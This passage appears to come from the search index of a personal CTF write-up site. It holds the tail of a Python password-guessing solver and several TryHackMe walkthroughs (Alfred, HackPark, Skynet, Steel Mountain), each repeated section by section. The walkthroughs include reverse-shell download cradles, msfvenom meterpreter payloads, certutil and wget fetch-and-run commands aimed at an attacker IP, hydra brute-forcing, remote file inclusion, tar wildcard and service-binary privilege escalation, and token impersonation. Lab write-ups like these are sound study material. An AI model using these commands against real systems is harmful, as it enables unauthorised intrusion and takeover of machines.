, user : str , password : str , future : asyncio . Future ): self . futures . append (( user , password , future )) if len ( self . futures ) == self . guessers : self . resolve_batch () def resolve_batch ( self ): futures = self . futures self . futures = [] self . r . recvline ( timeout = 0.1 ) query = \",\" . join ( f \" { user } : { password } \" for ( user , password , future ) in futures ) self . r . sendline ( query ) result = self . r . recvline () . decode () . strip () results = result . split ( \",\" ) log . debug ( f \"Results: { results !r} \" ) for resp , ( user , password , future ) in zip ( results , futures ): log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return \"_\" if p != s : return \"0\" return \"1\" class FakeLoader ( Loader ): def __init__ ( self , r : remote , user_data : Dict [ str , str ]): super () . __init__ ( r ) self . user_data = user_data def add_guesser ( self ): super ( FakeLoader , self ) . add_guesser () def resolve_batch ( self ): futures = self . futures self . futures = [] for user , password , future in futures : sample = self . user_data [ user ] resp = check_pwd ( sample , password ) log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) class GuesserAsync : def __init__ ( self , loader : Loader , user : str ): self . loader = loader if \":\" in user : self . user , max_len = user . split ( \":\" ) self . max_len = int ( max_len ) else : self . user = user self . max_len = None log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () async def check ( self , password ): log . debug ( f \"Check: { password } \" ) loop = asyncio . get_running_loop () future = loop . create_future () self . loader . submit ( self . user , password , future ) return await future async def guess_words ( self , words , password : str = \"\" ): for word in words : test = password + word if await self . check ( test ): return test else : return None async def guess_words_smart ( self , words , password : str = \"\" , round = None ): if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () # Silly optimizations if self . max_len is not None : current = len ( password ) delta = self . max_len - current if round == 3 : pass first_letters = Counter ( word [ 0 ] for word , next_word in product ( words , nato_phonetic ) if len ( word + next_word ) == delta ) . most_common () elif round == 4 : words = [ word for word in words if len ( word ) == delta ] if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( new_words , password , round = round ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s , round = round ) async def solve ( self ): try : password = await self . guess_words_smart ( days ) password = await self . guess_words_smart ( movies , password ) password = await self . guess_words_smart ( elements , password , round = 3 ) await self . guess_words_smart ( nato_phonetic , password , round = 4 ) log . error ( \"Something after phonetic alphabet\" ) raise ValueError except SuccessfulConnection as e : log . debug ( f \"User: { self . user } \" ) log . debug ( f \"Password: { e . args [ 0 ] } \" ) self . loader . remove_guesser () return True , self . guesses , e . args [ 0 ], self . user async def main (): log . setLevel ( \"INFO\" ) r = remote ( HOST , PORT ) r . recvuntil ( \"remaining. \\n \" ) loader = Loader ( r ) for i in tqdm ( range ( 0 , 400 , CONCURRENCY )): if i == 200 : loader . total_guessers = 0 loader . incorrect_guesses = 0 log . debug ( r . recvuntil ( \"remaining. \\n \" , timeout = 0.5 ) . decode ()) r . sendline ( str ( CONCURRENCY )) users = r . recvline ( keepends = False ) . decode () . split ( \",\" ) log . debug ( r . recvline ( keepends = False ) . decode ()) guessers = [ GuesserAsync ( loader , user ) for user in users ] await asyncio . gather ( * [ guesser . solve () for guesser in guessers ]) avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) print ( r . recvall ( timeout = 2 )) async def fake_main (): log . setLevel ( \"INFO\" ) with open ( \"results.csv\" ) as f : reader = csv . reader ( f ) passwords = [ row [ 2 ] for row in reader if row [ 0 ] == \"True\" ] user_data = { str ( uuid4 ()): password for password in passwords } loader = FakeLoader ( None , user_data ) for user , password in tqdm ( user_data . items ()): guesser = GuesserAsync ( loader , f \" { user } : { len ( password ) } \" ) await guesser . solve () avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) if __name__ == \"__main__\" : asyncio . run ( main ()) # asyncio.run(fake_main())","title":"Source Code"},{"location":"writeups/TryHackMe/alfred/","text":"Enumeration \u00b6 Target is a Windows machine so likely blocking ping Initial port scan sudo nmap -Pn 10 .10.17.213 Results: PORT STATE SERVICE 80 /tcp open http 3389 /tcp open ms-wbt-server 8080 /tcp open http-proxy Port 80 shows a webpage that looks like it's just for flavor. Port 3389 is RDP Port 8080 is a Jenkins server Tryhackme flag field had mask of *****:***** so tried admin:admin which worked Initial Access \u00b6 I cloned Nishang ( https://github.com/samratashok/nishang.git ) and served the Shells directory with python -m http.server Started a netcat listener on port 9001 Created a Jenkins project with a build step of Execute Windows batch command with the command: powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.32.196:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.32.196 -Port 9001 Save the project and press Start Build. This gets a reverse shell for powershell Switching Shells \u00b6 Start exploit/multi/handler on port 9001 Generate shell.exe with msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 'LHOST=10.4.32.196' LPORT = 8081 -f exe > shell.exe Host shell.exe with python -m http.server Run shell from powershell with ( New-Object System . Net . WebClient ). Downloadfile ( 'http://10.4.32.196:8000/shell.exe' , 'C:\\Users\\Public\\Documents\\shell.exe' ) Start-Process C :\\ Users \\ Public \\ Documents \\ shell . exe Privilege Escalation \u00b6 From the powershell session check privs with whoami / priv In meterpreter the same can be done with getprivs Of interest are: SeDebugPrivilege SeImpersonatePrivilege We load the meterpreter incognito module and list available tokens to use use incognito list_tokens -g Output: Delegation Tokens Available ======================================== \\ BUILTIN\\Administrators BUILTIN\\IIS_IUSRS BUILTIN\\Users NT AUTHORITY\\Authenticated Users ...SNIP... Impersonation Tokens Available ======================================== NT AUTHORITY\\NETWORK NT SERVICE\\AudioSrv ...SNIP... We select BUILTIN\\Administrators to impersonate impersonate_token \"BUILTIN\\Administrators\" Checking user ( getuid ) reveals we are now running as NT AUTHORITY\\SYSTEM Since some permissions are enforced based off actual user not effective user of process, we have to migrate to a new process. TryHackMe recommends services.exe so we go there. For some reason I wasn't able to view the file from services.exe so I had to add a user, RDP in and retrieve the flag through Explorer.","title":"Alfred WriteUp"},{"location":"writeups/TryHackMe/alfred/#enumeration","text":"Target is a Windows machine so likely blocking ping Initial port scan sudo nmap -Pn 10 .10.17.213 Results: PORT STATE SERVICE 80 /tcp open http 3389 /tcp open ms-wbt-server 8080 /tcp open http-proxy Port 80 shows a webpage that looks like it's just for flavor. Port 3389 is RDP Port 8080 is a Jenkins server Tryhackme flag field had mask of *****:***** so tried admin:admin which worked","title":"Enumeration"},{"location":"writeups/TryHackMe/alfred/#initial-access","text":"I cloned Nishang ( https://github.com/samratashok/nishang.git ) and served the Shells directory with python -m http.server Started a netcat listener on port 9001 Created a Jenkins project with a build step of Execute Windows batch command with the command: powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.32.196:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.32.196 -Port 9001 Save the project and press Start Build. This gets a reverse shell for powershell","title":"Initial Access"},{"location":"writeups/TryHackMe/alfred/#switching-shells","text":"Start exploit/multi/handler on port 9001 Generate shell.exe with msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 'LHOST=10.4.32.196' LPORT = 8081 -f exe > shell.exe Host shell.exe with python -m http.server Run shell from powershell with ( New-Object System . Net . WebClient ). Downloadfile ( 'http://10.4.32.196:8000/shell.exe' , 'C:\\Users\\Public\\Documents\\shell.exe' ) Start-Process C :\\ Users \\ Public \\ Documents \\ shell . exe","title":"Switching Shells"},{"location":"writeups/TryHackMe/alfred/#privilege-escalation","text":"From the powershell session check privs with whoami / priv In meterpreter the same can be done with getprivs Of interest are: SeDebugPrivilege SeImpersonatePrivilege We load the meterpreter incognito module and list available tokens to use use incognito list_tokens -g Output: Delegation Tokens Available ======================================== \\ BUILTIN\\Administrators BUILTIN\\IIS_IUSRS BUILTIN\\Users NT AUTHORITY\\Authenticated Users ...SNIP... Impersonation Tokens Available ======================================== NT AUTHORITY\\NETWORK NT SERVICE\\AudioSrv ...SNIP... We select BUILTIN\\Administrators to impersonate impersonate_token \"BUILTIN\\Administrators\" Checking user ( getuid ) reveals we are now running as NT AUTHORITY\\SYSTEM Since some permissions are enforced based off actual user not effective user of process, we have to migrate to a new process. TryHackMe recommends services.exe so we go there. For some reason I wasn't able to view the file from services.exe so I had to add a user, RDP in and retrieve the flag through Explorer.","title":"Privilege Escalation"},{"location":"writeups/TryHackMe/hackpark/","text":"Enumeration \u00b6 Initial port scan export TARGET_IP = \"10.10.172.216\" nmap -Pn $TARGET_IP Output PORT STATE SERVICE 80 /tcp open http 3389 /tcp open ms-wbt-server So we have RDP and a HTTP server Website appears to be an aspx based CMS \"blogengine.net\" Attempting to login makes a POST request to /Account/login.aspx Web Access \u00b6 hydra -I -l admin -P /usr/share/wordlists/rockyou.txt 10 .10.172.216 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=EWGN3t6CyJTEWk%2FRgVv08LEg21xa3%2FIWO0YF1Z6fNbOzdTtNdjEi6adB5p794MlT2qq45TpeZKlI2KU04RVSb%2BhTZTi30ad7m4oqX0EM9qPfXl6cIpx14itIc9YnfBtMEcZepgWs8dybyBv3n4PjKa1rDgQD9xGjxAAUTUTz2sidxIwN&__EVENTVALIDATION=1jIK9zCZ3IE2OlqMT8JAnCqjc%2BenU2dN36%2Fsbwmgn%2Bt0QRR78NSzX8o1V15PehbuBX%2BdOBImNsPSPHIgneX6%2FRnQzSiS2T%2Fozd2wcSjsFMVUFHjmu4WBX7TGO5qwubiNTfLi3VtgPEj4bG%2BA8jqxcGb2VButcFMaAJW4zjWhCRkrRrXD&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f Takes a few mins but get [80][http-post-form] host: 10.10.172.216 login: admin password: Once logged in with above creds, going to ABOUT show version is 3.3.6.0 Initial Access \u00b6 Searching exploit-db found https://www.exploit-db.com/exploits/46353 I saved the file and changed the IP and port to my own before uploading through the Content > Post > Upload I visited http://10.10.172.216//?theme=../../App_Data/files to trigger the exploit Meterpreter \u00b6 Generated a shell msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 'LHOST=10.4.32.196' LPORT = 8081 -f exe > shell.exe Started a msfconsole multi handler Ran a python -m http.server Downloaded and ran the shell from the cmd shell with certutil.exe -urlcache -split -f \"http://10.4.32.196:8000/shell.exe\" C:\\users\\public\\shell.exe START /B /I C:\\users\\public\\shell.exe PrivEsc \u00b6 By looking in C:\\Program Files (x86) a strange directory called SystemScheduler was found The corresponding Windows service was windowsscheduler Without metasploit \u00b6 certutil.exe -urlcache -split -f \"http://10.4.32.196:8000/winPEASany.exe\" C:\\users\\public\\winpeasany.exe START /B /I C:\\users\\public\\shell.exe","title":"HackPark WriteUp"},{"location":"writeups/TryHackMe/hackpark/#enumeration","text":"Initial port scan export TARGET_IP = \"10.10.172.216\" nmap -Pn $TARGET_IP Output PORT STATE SERVICE 80 /tcp open http 3389 /tcp open ms-wbt-server So we have RDP and a HTTP server Website appears to be an aspx based CMS \"blogengine.net\" Attempting to login makes a POST request to /Account/login.aspx","title":"Enumeration"},{"location":"writeups/TryHackMe/hackpark/#web-access","text":"hydra -I -l admin -P /usr/share/wordlists/rockyou.txt 10 .10.172.216 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=EWGN3t6CyJTEWk%2FRgVv08LEg21xa3%2FIWO0YF1Z6fNbOzdTtNdjEi6adB5p794MlT2qq45TpeZKlI2KU04RVSb%2BhTZTi30ad7m4oqX0EM9qPfXl6cIpx14itIc9YnfBtMEcZepgWs8dybyBv3n4PjKa1rDgQD9xGjxAAUTUTz2sidxIwN&__EVENTVALIDATION=1jIK9zCZ3IE2OlqMT8JAnCqjc%2BenU2dN36%2Fsbwmgn%2Bt0QRR78NSzX8o1V15PehbuBX%2BdOBImNsPSPHIgneX6%2FRnQzSiS2T%2Fozd2wcSjsFMVUFHjmu4WBX7TGO5qwubiNTfLi3VtgPEj4bG%2BA8jqxcGb2VButcFMaAJW4zjWhCRkrRrXD&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f Takes a few mins but get [80][http-post-form] host: 10.10.172.216 login: admin password: Once logged in with above creds, going to ABOUT show version is 3.3.6.0","title":"Web Access"},{"location":"writeups/TryHackMe/hackpark/#initial-access","text":"Searching exploit-db found https://www.exploit-db.com/exploits/46353 I saved the file and changed the IP and port to my own before uploading through the Content > Post > Upload I visited http://10.10.172.216//?theme=../../App_Data/files to trigger the exploit","title":"Initial Access"},{"location":"writeups/TryHackMe/hackpark/#meterpreter","text":"Generated a shell msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 'LHOST=10.4.32.196' LPORT = 8081 -f exe > shell.exe Started a msfconsole multi handler Ran a python -m http.server Downloaded and ran the shell from the cmd shell with certutil.exe -urlcache -split -f \"http://10.4.32.196:8000/shell.exe\" C:\\users\\public\\shell.exe START /B /I C:\\users\\public\\shell.exe","title":"Meterpreter"},{"location":"writeups/TryHackMe/hackpark/#privesc","text":"By looking in C:\\Program Files (x86) a strange directory called SystemScheduler was found The corresponding Windows service was windowsscheduler","title":"PrivEsc"},{"location":"writeups/TryHackMe/hackpark/#without-metasploit","text":"certutil.exe -urlcache -split -f \"http://10.4.32.196:8000/winPEASany.exe\" C:\\users\\public\\winpeasany.exe START /B /I C:\\users\\public\\shell.exe","title":"Without metasploit"},{"location":"writeups/TryHackMe/skynet/","text":"Enumeration \u00b6 TryHackMe provides very little info so will just jump in. Initial port scan sudo nmap -sV 10 .10.59.216 Results: PORT STATE SERVICE VERSION 22 /tcp open ssh OpenSSH 7 .2p2 Ubuntu 4ubuntu2.8 ( Ubuntu Linux ; protocol 2 .0 ) 80 /tcp open http Apache httpd 2 .4.18 (( Ubuntu )) 110 /tcp open pop3 Dovecot pop3d 139 /tcp open netbios-ssn Samba smbd 3 .X - 4 .X ( workgroup: WORKGROUP ) 143 /tcp open imap Dovecot imapd 445 /tcp open netbios-ssn Samba smbd 3 .X - 4 .X ( workgroup: WORKGROUP ) Service Info: Host: SKYNET ; OS: Linux ; CPE: cpe:/o:linux:linux_kernel Of note: OpenSSH 7.2 is potentially vulnerable to User enumeration via linux/remote/45939.py Webserver on port 80 Samba shares Web Enumeration \u00b6 Started enumerating web page with gobuster dir -u http://10.10.59.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt Output: /admin (Status: 301) [Size: 312] [--> http://10.10.59.216/admin/] /css (Status: 301) [Size: 310] [--> http://10.10.59.216/css/] /js (Status: 301) [Size: 309] [--> http://10.10.59.216/js/] /config (Status: 301) [Size: 313] [--> http://10.10.59.216/config/] /ai (Status: 301) [Size: 309] [--> http://10.10.59.216/ai/] /squirrelmail (Status: 301) [Size: 319] [--> http://10.10.59.216/squirrelmail/] Which discovered /squirrelmail which was running version 1.4.23 SMB Enumeration \u00b6 Enumerated shares with nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse 10 .10.59.216 Of interest are anonymous with anonymous read/write and milesdyson which we dont have privs for In the anonymous share was a note attention.txt and logs folder A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. -Miles Dyson Logs folder contained 3 files log1.txt log2.txt and log3.txt. 2 and 3 were empty but 1 contained a list of passwords. cyborg007haloterminator terminator22596 terminator219 terminator20 terminator1989 terminator1988 terminator168 terminator16 terminator143 terminator13 terminator123!@# terminator1056 terminator101 terminator10 terminator02 terminator00 roboterminator pongterminator manasturcaluterminator exterminator95 exterminator200 dterminator djxterminator dexterminator determinator cyborg007haloterminator avsterminator alonsoterminator Walterminator 79terminator6 1996terminator Webmail Access \u00b6 Given the private smb share was called milesdyson I guessed this might be a username. I was about to use the password list to password spray the squirrelmail webmail, but when I tried the first password cyborg007haloterminator it worked so I left it there. The user had 3 emails in the inbox Email 1 From: serenakogan@skynet Subject: Date: Tue, September 17, 2019 3:13 am To: i can i i everything else . . . . . . . . . . . . . . balls have zero to me to me to me to me to me to me to me to me to you i everything else . . . . . . . . . . . . . . balls have a ball to me to me to me to me to me to me to me i i can i i i everything else . . . . . . . . . . . . . . balls have a ball to me to me to me to me to me to me to me i . . . . . . . . . . . . . . . . . . . balls have zero to me to me to me to me to me to me to me to me to you i i i i i everything else . . . . . . . . . . . . . . balls have 0 to me to me to me to me to me to me to me to me to you i i i everything else . . . . . . . . . . . . . . balls have zero to me to me to me to me to me to me to me to me to Email 2 From: serenakogan@skynet Subject: Date: Tue, September 17, 2019 3:16 am Tomail 3 From: skynet@skynet Subject: Samba Password reset Date: Tue, September 17, 2019 10:10 pm To: We have changed your smb password after system malfunction. Password: )s{A&2Z=F^n_E.B` Using this password to access the milesdyson share over SMB worked (username milesdyson ) This revealed a folder with multiple PDFs about AI/ML and a subdirectory called notes. Given an HTTP folder called /ai was found by gobuster, I checked if it was serving this directory by going to /ai/notes in the browser. This gave an HTTP redirect to /ai/notes/ and gives 403 which is different behaviour from say /ai/something which just gives 404 The notes directory contained a file called important.txt which hinted at a beta CMS located at /45kra24zxs28v3yd So I started gobustering the location which found /administrator which showed that it was running cuppa cms . Some googling found a file inclusion vulnerability in cuppa cms ( https://www.exploit-db.com/exploits/25971 ) Used msfvenom to make a meterpreter shell and staged with a PHP reverse shell. curl http://10.10.59.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig = http://10.4.32.196:8000/payload.php? In shell wget http://10.4.32.196:8000/shell.elf -O /tmp/shell chmod +x /tmp/shell /tmp/shell & Used LinEnum.sh to search for issues https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh Found crontab runs every minute /home/milesdyson/backups/backup.sh backup.sh contents #!/bin/bash cd /var/www/html tar cf /home/milesdyson/backups/backup.tgz * This is vulnerable to wildcard hijacking ( https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ ) To exploit, create a file /var/www/html/script.sh with #!/bin/bash /tmp/shell & From meterpreter open a shell and run cd /var/www/html touch './--checkpoint-action=exec=bash script.sh' touch './--checkpoint=1' Enjoy the root shell! cat /root/root.txt","title":"Skynet WriteUp"},{"location":"writeups/TryHackMe/skynet/#enumeration","text":"TryHackMe provides very little info so will just jump in. Initial port scan sudo nmap -sV 10 .10.59.216 Results: PORT STATE SERVICE VERSION 22 /tcp open ssh OpenSSH 7 .2p2 Ubuntu 4ubuntu2.8 ( Ubuntu Linux ; protocol 2 .0 ) 80 /tcp open http Apache httpd 2 .4.18 (( Ubuntu )) 110 /tcp open pop3 Dovecot pop3d 139 /tcp open netbios-ssn Samba smbd 3 .X - 4 .X ( workgroup: WORKGROUP ) 143 /tcp open imap Dovecot imapd 445 /tcp open netbios-ssn Samba smbd 3 .X - 4 .X ( workgroup: WORKGROUP ) Service Info: Host: SKYNET ; OS: Linux ; CPE: cpe:/o:linux:linux_kernel Of note: OpenSSH 7.2 is potentially vulnerable to User enumeration via linux/remote/45939.py Webserver on port 80 Samba shares","title":"Enumeration"},{"location":"writeups/TryHackMe/skynet/#web-enumeration","text":"Started enumerating web page with gobuster dir -u http://10.10.59.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt Output: /admin (Status: 301) [Size: 312] [--> http://10.10.59.216/admin/] /css (Status: 301) [Size: 310] [--> http://10.10.59.216/css/] /js (Status: 301) [Size: 309] [--> http://10.10.59.216/js/] /config (Status: 301) [Size: 313] [--> http://10.10.59.216/config/] /ai (Status: 301) [Size: 309] [--> http://10.10.59.216/ai/] /squirrelmail (Status: 301) [Size: 319] [--> http://10.10.59.216/squirrelmail/] Which discovered /squirrelmail which was running version 1.4.23","title":"Web Enumeration"},{"location":"writeups/TryHackMe/skynet/#smb-enumeration","text":"Enumerated shares with nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse 10 .10.59.216 Of interest are anonymous with anonymous read/write and milesdyson which we dont have privs for In the anonymous share was a note attention.txt and logs folder A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. -Miles Dyson Logs folder contained 3 files log1.txt log2.txt and log3.txt. 2 and 3 were empty but 1 contained a list of passwords. cyborg007haloterminator terminator22596 terminator219 terminator20 terminator1989 terminator1988 terminator168 terminator16 terminator143 terminator13 terminator123!@# terminator1056 terminator101 terminator10 terminator02 terminator00 roboterminator pongterminator manasturcaluterminator exterminator95 exterminator200 dterminator djxterminator dexterminator determinator cyborg007haloterminator avsterminator alonsoterminator Walterminator 79terminator6 1996terminator","title":"SMB Enumeration"},{"location":"writeups/TryHackMe/skynet/#webmail-access","text":"Given the private smb share was called milesdyson I guessed this might be a username. I was about to use the password list to password spray the squirrelmail webmail, but when I tried the first password cyborg007haloterminator it worked so I left it there. The user had 3 emails in the inbox Email 1 From: serenakogan@skynet Subject: Date: Tue, September 17, 2019 3:13 am To: i can i i everything else . . . . . . . . . . . . . . balls have zero to me to me to me to me to me to me to me to me to you i everything else . . . . . . . . . . . . . . balls have a ball to me to me to me to me to me to me to me i i can i i i everything else . . . . . . . . . . . . . . balls have a ball to me to me to me to me to me to me to me i . . . . . . . . . . . . . . . . . . . balls have zero to me to me to me to me to me to me to me to me to you i i i i i everything else . . . . . . . . . . . . . . balls have 0 to me to me to me to me to me to me to me to me to you i i i everything else . . . . . . . . . . . . . . balls have zero to me to me to me to me to me to me to me to me to Email 2 From: serenakogan@skynet Subject: Date: Tue, September 17, 2019 3:16 am Tomail 3 From: skynet@skynet Subject: Samba Password reset Date: Tue, September 17, 2019 10:10 pm To: We have changed your smb password after system malfunction. Password: )s{A&2Z=F^n_E.B` Using this password to access the milesdyson share over SMB worked (username milesdyson ) This revealed a folder with multiple PDFs about AI/ML and a subdirectory called notes. Given an HTTP folder called /ai was found by gobuster, I checked if it was serving this directory by going to /ai/notes in the browser. This gave an HTTP redirect to /ai/notes/ and gives 403 which is different behaviour from say /ai/something which just gives 404 The notes directory contained a file called important.txt which hinted at a beta CMS located at /45kra24zxs28v3yd So I started gobustering the location which found /administrator which showed that it was running cuppa cms . Some googling found a file inclusion vulnerability in cuppa cms ( https://www.exploit-db.com/exploits/25971 ) Used msfvenom to make a meterpreter shell and staged with a PHP reverse shell. curl http://10.10.59.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig = http://10.4.32.196:8000/payload.php? In shell wget http://10.4.32.196:8000/shell.elf -O /tmp/shell chmod +x /tmp/shell /tmp/shell & Used LinEnum.sh to search for issues https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh Found crontab runs every minute /home/milesdyson/backups/backup.sh backup.sh contents #!/bin/bash cd /var/www/html tar cf /home/milesdyson/backups/backup.tgz * This is vulnerable to wildcard hijacking ( https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ ) To exploit, create a file /var/www/html/script.sh with #!/bin/bash /tmp/shell & From meterpreter open a shell and run cd /var/www/html touch './--checkpoint-action=exec=bash script.sh' touch './--checkpoint=1' Enjoy the root shell! cat /root/root.txt","title":"Webmail Access"},{"location":"writeups/TryHackMe/steel_mountain/","text":"Enumeration \u00b6 Target is a Windows machine so likely blocking ping Initial port scan sudo nmap -Pn 10 .10.115.107 Results: PORT STATE SERVICE 80 /tcp open http 135 /tcp open msrpc 139 /tcp open netbios-ssn 445 /tcp open microsoft-ds 3389 /tcp open ms-wbt-server 8080 /tcp open http-proxy 49152 /tcp open unknown 49153 /tcp open unknown 49154 /tcp open unknown 49155 /tcp open unknown 49157 /tcp open unknown 49163 /tcp open unknown Port 80 shows a webpage saying employee of the month. The image name is BillHarper.png answering who the employee is. Digging into http server on port 8080 sudo nmap -Pn -p 8080 -sV 10 .10.115.107 ... PORT STATE SERVICE VERSION 8080 /tcp open http HttpFileServer httpd 2 .3 Googling revealed the name is Rejetto HTTP File Server and version 2.3 has an RCE vuln. Initial Access \u00b6 searchsploit rejetto showed the exploits locally and so I copied the exploit to make modifications cp /usr/share/exploitdb/exploits/windows/remote/39161.py exploit.py I edited the exploit to have my ip_addr and port 1234. I opened msfconsole and started a shell handler use exploit/multi/handler set payload windows/shell/reverse_tcp set LHOST 0.0.0.0 set LPORT 1234 set exitonsession false run -j The exitonsession false is important as the exploit comments say that it will spawn multiple shells and that we need to handle that. I received 4 shells. Getting Meterpreter \u00b6 The shell upgrade module failed so had to instead create a meterpreter binary and copy it over. msfvenom -e x86/shikata_ga_nai -p windows/meterpreter/reverse_tcp 'LHOST=10.4.32.196' LPORT = 8081 -f exe > /var/www/html/steelmountain.exe Started a handler with use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LPORT 8081 run -j From one of the windows sessions I downloaded and ran the implant with: certutil.exe -urlcache -split -f \"http://10.4.32.196/steelmountain.exe\" C:\\Users\\bill\\steelmountain.exe cd C:\\Users\\bill START /B /I steelmountain.exe I then backgrounded the session with Ctrl + Z Escalation \u00b6 Copied latest version of PowerUp.ps1 to machine . .\\ PowerUp . ps1 Invoke-AllChecks Output ServiceName : AdvancedSystemCareService9 Path : C: \\P rogram Files ( x86 ) \\I Obit \\A dvanced SystemCare \\A SCService.exe ModifiablePath : @ { ModifiablePath = C: \\; IdentityReference = BUILTIN \\U sers ; Permissions = WriteData/AddFile } StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath> CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths I then backgrounded the session with Ctrl + Z Meaning we can stop the AdvancedSystemCareService9 service, replace C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe with a malicious binary and restart the service to elevate to system. Generated replacement with msfvenom -p windows/shell_reverse_tcp LHOST = 10 .4.32.196 LPORT = 4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe Start a netcat listener nc -vlp 4443 In meterpreter stop the service, replace the binary and restart it load extapi service_control stop advancedsystemcareservice9 cd C:/Program\\ Files\\ (x86)/IObit/Advanced\\ SystemCare/ cp ASCService.exe ASCService.exe.bak upload Advanced.exe ASCService.exe service_control start advancedsystemcareservice9 We then get a lovely message in our nc terminal connect to [10.4.32.196] from (UNKNOWN) [10.10.141.129] 49258 Microsoft Windows [Version 6.3.9600] ( c ) 2013 Microsoft Corporation. All rights reserved. C : \\Windows\\system32 > From the shell, get the admin flag with: type C:\\Users\\Administrator\\Desktop","title":"Steel Mountain WriteUp"},{"location":"writeups/TryHackMe/steel_mountain/#enumeration","text":"Target is a Windows machine so likely blocking ping Initial port scan sudo nmap -Pn 10 .10.115.107 Results: PORT STATE SERVICE 80 /tcp open http 135 /tcp open msrpc 139 /tcp open netbios-ssn 445 /tcp open microsoft-ds 3389 /tcp open ms-wbt-server 8080 /tcp open http-proxy 49152 /tcp open unknown 49153 /tcp open unknown 49154 /tcp open unknown 49155 /tcp open unknown 49157 /tcp open unknown 49163 /tcp open unknown Port 80 shows a webpage saying employee of the month. The image name is BillHarper.png answering who the employee is. Digging into http server on port 8080 sudo nmap -Pn -p 8080 -sV 10 .10.115.107 ... PORT STATE SERVICE VERSION 8080 /tcp open http HttpFileServer httpd 2 .3 Googling revealed the name is Rejetto HTTP File Server and version 2.3 has an RCE vuln.","title":"Enumeration"},{"location":"writeups/TryHackMe/steel_mountain/#initial-access","text":"searchsploit rejetto showed the exploits locally and so I copied the exploit to make modifications cp /usr/share/exploitdb/exploits/windows/remote/39161.py exploit.py I edited the exploit to have my ip_addr and port 1234. I opened msfconsole and started a shell handler use exploit/multi/handler set payload windows/shell/reverse_tcp set LHOST 0.0.0.0 set LPORT 1234 set exitonsession false run -j The exitonsession false is important as the exploit comments say that it will spawn multiple shells and that we need to handle that. I received 4 shells.","title":"Initial Access"},{"location":"writeups/TryHackMe/steel_mountain/#getting-meterpreter","text":"The shell upgrade module failed so had to instead create a meterpreter binary and copy it over. msfvenom -e x86/shikata_ga_nai -p windows/meterpreter/reverse_tcp 'LHOST=10.4.32.196' LPORT = 8081 -f exe > /var/www/html/steelmountain.exe Started a handler with use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LPORT 8081 run -j From one of the windows sessions I downloaded and ran the implant with: certutil.exe -urlcache -split -f \"http://10.4.32.196/steelmountain.exe\" C:\\Users\\bill\\steelmountain.exe cd C:\\Users\\bill START /B /I steelmountain.exe I then backgrounded the session with Ctrl + Z","title":"Getting Meterpreter"},{"location":"writeups/TryHackMe/steel_mountain/#escalation","text":"Copied latest version of PowerUp.ps1 to machine . .\\ PowerUp . ps1 Invoke-AllChecks Output ServiceName : AdvancedSystemCareService9 Path : C: \\P rogram Files ( x86 ) \\I Obit \\A dvanced SystemCare \\A SCService.exe ModifiablePath : @ { ModifiablePath = C: \\; 